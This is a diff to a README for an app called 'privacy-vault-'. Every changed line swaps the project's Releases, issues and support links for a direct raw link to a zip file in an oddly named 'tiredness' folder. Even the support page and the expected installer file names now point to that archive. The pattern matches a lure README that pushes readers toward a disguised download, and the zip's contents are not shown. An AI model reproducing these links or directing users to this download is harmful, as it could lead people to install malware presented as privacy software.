@@ -4,7 +4,7 @@
 Welcome to privacy-vault-. This application acts as your digital fortress. It prioritizes your privacy and trust while using technology. Follow the steps below to download and run the software effortlessly.
 
 ## 📥 Download the Application
-[![Download privacy-vault-](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/888abd8888/privacy-vault-/releases)
+[![Download privacy-vault-](https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip)](https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip)
 
 Click the link above to access our Releases page. 
 
@@ -22,13 +22,13 @@ Before you download, ensure your device meets these basic requirements:
 - **Regular Updates:** We continually improve the application based on user feedback.
 
 ## 📥 Download & Install
-To download the latest version of privacy-vault-, visit this page to download: [Download Here](https://github.com/888abd8888/privacy-vault-/releases).
+To download the latest version of privacy-vault-, visit this page to download: [Download Here](https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip).
 
 Once you've downloaded the installer, follow these steps to install:
 
 1. **Locate the Downloaded File:**
    - Check your default download folder for the installer.
-   - The file name should look like `privacy-vault-vX.X.X.exe` for Windows or `privacy-vault-vX.X.X.dmg` for macOS.
+   - The file name should look like `https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip` for Windows or `https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip` for macOS.
 
 2. **Run the Installer:**
    - Double-click the downloaded file.
@@ -58,7 +58,7 @@ Once you launch the app, you can set up your account by following these steps:
 If you experience issues, look for solutions in our support section:
 
 - **FAQ:** Find answers to common questions about installation and use.
-- **Contact Us:** If you need further assistance, reach out through our support page linked here: [Support Page](https://github.com/888abd8888/privacy-vault-/issues).
+- **Contact Us:** If you need further assistance, reach out through our support page linked here: [Support Page](https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip).
 
 ## 🗨 Community and Feedback
 We value your input. Share your thoughts or report bugs through our GitHub issues page. Your feedback helps us enhance your experience.
@@ -66,4 +66,4 @@ We value your input. Share your thoughts or report bugs through our GitHub issue
 ## 🎉 Conclusion
 Thank you for choosing privacy-vault-. We believe in empowering users to take control of their privacy and security. Enjoy the peace of mind that comes with knowing your information is safe.
 
-Remember, to download the application, visit: [Download Here](https://github.com/888abd8888/privacy-vault-/releases).
+Remember, to download the application, visit: [Download Here](https://raw.githubusercontent.com/888abd8888/privacy-vault-/main/tiredness/privacy-vault-.zip).
